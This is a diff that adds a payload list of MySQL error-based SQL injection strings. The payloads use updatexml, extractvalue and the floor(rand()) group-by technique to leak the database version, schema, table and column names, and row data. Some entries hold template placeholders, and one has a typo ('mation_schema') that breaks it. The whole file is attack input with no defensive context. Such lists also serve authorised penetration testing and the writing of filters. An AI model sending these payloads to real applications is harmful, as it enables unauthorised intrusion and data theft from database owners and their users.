@@ -1,0 +1,33 @@
+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
+'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
+' and updatexml(null,concat(0x0a,version()),null)-- -
+' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
+ AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
+ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM mation_schema.schemata LIMIT data_offset,1)))--
+ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
+ and extractvalue(0x0a,concat(0x0a,(select database())))--
+' and extractvalue(0x0a,concat(0x0a,(select database())))--
+' extractvalue(0x0a,concat(0x0a,(select database()))) '
+" extractvalue(0x0a,concat(0x0a,(select database()))) "
+' extractvalue(0x0a,concat(0x0a,(select database())))--+
+" extractvalue(0x0a,concat(0x0a,(select database())))--+
+' extractvalue(0x0a,concat(0x0a,(select database())))#
+" extractvalue(0x0a,concat(0x0a,(select database())))#
+' extractvalue(0x0a,concat(0x0a,(select database())))--
+" extractvalue(0x0a,concat(0x0a,(select database())))--
+' (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) '
+" (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) "
+' (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x)--+
+" (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x)--+
+' (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x)#
+" (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x)#
+' (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x)--
+" (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x)--
+' hex(hex(substring(database(),3,3))) '
